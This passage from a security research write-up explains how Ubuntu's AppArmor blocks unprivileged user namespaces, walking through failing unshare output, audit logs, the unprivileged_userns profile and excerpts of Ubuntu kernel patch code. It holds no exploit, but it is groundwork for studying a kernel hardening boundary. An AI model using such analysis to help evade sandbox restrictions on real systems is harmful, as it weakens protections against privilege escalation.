  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/ipa_verify&lt;/code&gt;: The profile applies to the binary located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/ipa_verify&lt;/code&gt;. When executed, this profile is automatically loaded.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flags=(unconfined)&lt;/code&gt;: This profile is in unconfined status. Although the profile is loaded, it does not restrict the applicationâ€™s behavior.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;userns&lt;/code&gt;: Allows the application to use user namespaces.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Users can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa-status&lt;/code&gt; tool to list active profiles and their statuses. Below is an example JSON output:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;{
    &quot;version&quot;: &quot;2&quot;,
    &quot;profiles&quot;: {
        &quot;/snap/snapd/23258/usr/lib/snapd/snap-confine&quot;: &quot;enforce&quot;,
        &quot;/usr/sbin/sssd&quot;: &quot;complain&quot;,
        &quot;Discord&quot;: &quot;unconfined&quot;
    },
    &quot;processes&quot;: {
        &quot;/usr/sbin/rsyslogd&quot;: [
            {
                &quot;profile&quot;: &quot;rsyslogd&quot;,
                &quot;pid&quot;: &quot;1176&quot;,
                &quot;status&quot;: &quot;enforce&quot;
            }
        ]
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;22-behavior-in-ubuntu&quot;&gt;2.2. Behavior in Ubuntu&lt;/h3&gt;

&lt;p&gt;Users can use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unshare&lt;/code&gt; tool to execute target binary under an unprivileged user namespace. However, after the introduction of new security mechanisms, executing this command on Ubuntu results in an &lt;strong&gt;â€œOperation not permittedâ€ (-EPERM)&lt;/strong&gt; error.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;unshare &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; /bin/bash
unshare: write failed /proc/self/uid_map: Operation not permitted
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;At this point, if we check the kernel log using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmesg&lt;/code&gt; command, we will see some event logs related to AppArmor.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;dmesg
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;302291.394909] audit: &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1400 audit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1739761091.573:545&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: &lt;span class=&quot;nv&quot;&gt;apparmor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AUDIT&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;operation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;userns_create&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;namespace&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Userns create - transitioning profile&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unconfined&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;29466 &lt;span class=&quot;nb&quot;&gt;comm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unshare&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;requested&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;userns_create&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unprivileged_userns&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;302291.395747] audit: &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1400 audit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1739761091.574:546&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: &lt;span class=&quot;nv&quot;&gt;apparmor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;DENIED&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;operation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;capable&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;cap&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unprivileged_userns&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;pid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;29466 &lt;span class=&quot;nb&quot;&gt;comm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;unshare&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;capability&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;21  &lt;span class=&quot;nv&quot;&gt;capname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sys_admin&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ol&gt;
  &lt;li&gt;First AppArmor Event - Audit Event
    &lt;ul&gt;
      &lt;li&gt;This event logs execution details.&lt;/li&gt;
      &lt;li&gt;The event describes that a process with PID 29466 (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unshare&lt;/code&gt;) attempted to create a user namespace (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;operation=&quot;userns_create&quot;&lt;/code&gt;).&lt;/li&gt;
      &lt;li&gt;The process is currently unrestricted (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;profile=&quot;unconfined&quot;&lt;/code&gt;), meaning itâ€™s not bound to any AppArmor profile at the moment.&lt;/li&gt;
      &lt;li&gt;After this event, the process is assigned the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; profile.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Second AppArmor Event - Deny Event
    &lt;ul&gt;
      &lt;li&gt;This event indicates a denied operation.&lt;/li&gt;
      &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; profile restricts the process from using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_admin&lt;/code&gt; capability.&lt;/li&gt;
      &lt;li&gt;Since unshare requires &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sys_admin&lt;/code&gt; to create a new user namespace, AppArmor blocks the operation, leading to the &lt;strong&gt;â€œOperation not permitted (-EPERM)â€&lt;/strong&gt; error.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;In Ubuntu, all AppArmor profiles are stored in the directory:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaa@aaa:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt; /etc/apparmor.d/
total 528
drwxr-xr-x   9 root root  4096 Feb 17 10:46 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x 141 root root 12288 Feb 16 20:46 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root   354 Oct  2 07:24 1password
...
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root   699 Oct  2 07:24 unprivileged_userns
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apparmor.d/unprivileged_userns&lt;/code&gt; defines the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; profile. Below is part of the fileâ€™s content:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]

profile unprivileged_userns {
     audit deny capability,
     audit deny change_profile,

     [...]
     allow mqueue,
     allow ptrace,
     allow userns,
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The second event log we saw in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dmesg&lt;/code&gt; output comes from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;audit deny capability&lt;/code&gt; rule. This rule blocks all operations that require capabilities such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_ADMIN&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_NET_ADMIN&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_CHOWN&lt;/code&gt;, and logs any denied requests.&lt;/p&gt;

&lt;p&gt;Now that we understand creating a namespace is not allowed under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; profile, a key question arises:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Why is our process, which starts in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; profile, automatically transitioned to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; profile?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;To answer this, we need to dive into the AppArmor implementation in Ubuntu!&lt;/p&gt;

&lt;h2 id=&quot;3-investigating-ubuntu-kernel-patch&quot;&gt;3. Investigating Ubuntu Kernel Patch&lt;/h2&gt;

&lt;h3 id=&quot;31-analysis-strategy&quot;&gt;3.1. Analysis Strategy&lt;/h3&gt;

&lt;p&gt;Each Linux distribution modifies the Linux kernel based on its own needs, and Ubuntu is no exception.&lt;/p&gt;

&lt;p&gt;When analyzing the Ubuntu source, you will download two files: the base version of the Linux source code (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux_&amp;lt;ver&amp;gt;.orig.tar.gz&lt;/code&gt;) and a diff file containing Ubuntuâ€™s modifications (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux_&amp;lt;ver&amp;gt;-&amp;lt;x&amp;gt;.&amp;lt;y&amp;gt;.diff.gz&lt;/code&gt;, where x represents Ubuntuâ€™s maintained subversion, and y is usually a minor or patch release). To analyze Ubuntuâ€™s customizations, the patched source code is usually examined alongside the diff file.&lt;/p&gt;

&lt;p&gt;However, taking &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;linux_6.11.0-18.18.diff&lt;/code&gt; as an example, the patch contains over 260000 lines - so where should one begin?&lt;/p&gt;

&lt;p&gt;We can narrow the direction based on heuristics: the unusual behavior of AppArmor is only triggered by the &lt;strong&gt;unshare operation&lt;/strong&gt;. Additionally, &lt;strong&gt;certain strings in the audit event logs&lt;/strong&gt; can be searched to quickly locate key operations.&lt;/p&gt;

&lt;h3 id=&quot;32-diving-into-the-source&quot;&gt;3.2. Diving Into the Source&lt;/h3&gt;

&lt;p&gt;The function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;apparmor_userns_create()&lt;/code&gt; is triggered as an AppArmor hook and is executed when a namespace is created [1]. This function then calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_profile_ns_perm()&lt;/code&gt; to handle namespace permission-related settings  [2].&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;security_hook_list&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_hooks&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__ro_after_init&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;LSM_HOOK_INIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;userns_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_userns_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [1]&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;apparmor_userns_create&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cred&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_cred&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;begin_current_label_crit_section&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;aa_unprivileged_userns_restricted&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* default value: 1 */&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;label_mediates&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CLASS_NS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fn_label_build&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;aa_profile_ns_perm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [2]&lt;/span&gt;
                           &lt;span class=&quot;n&quot;&gt;AA_USERNS_CREATE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;end_current_label_crit_section&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_profile_ns_perm()&lt;/code&gt; detects that the profile is &lt;strong&gt;in unconfined status&lt;/strong&gt; [3] and that the currently used profile matches the &lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; profile&lt;/strong&gt; [4], it directly applies a hardcoded &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unprivileged_userns&lt;/code&gt; profile [5], which corresponds to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/apparmor.d/unprivileged_userns&lt;/code&gt;. This is the AppArmor profile that prevents us from creating unprivileged namespaces.&lt;/p&gt;

&lt;p&gt;The following code only includes a portion of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_profile_ns_perm()&lt;/code&gt; function. The full code contains numerous comments with &lt;strong&gt;â€œTODOâ€&lt;/strong&gt; and &lt;strong&gt;â€œhardcodeâ€&lt;/strong&gt;, indicating that the entire mechanism is still under development.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;aa_profile_ns_perm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;apparmor_audit_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;u32&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_ruleset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rules&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list_first_entry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                            &lt;span class=&quot;n&quot;&gt;typeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_perms&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;perms&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;aa_state_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;RULE_MEDIATES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rules&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile_unconfined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [3]&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profiles_ns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unconfined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [4]&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label_parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [5]&lt;/span&gt;
                         &lt;span class=&quot;s&quot;&gt;&quot;unprivileged_userns&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                         &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;ad&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Userns create - transitioning profile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;perms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;audit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
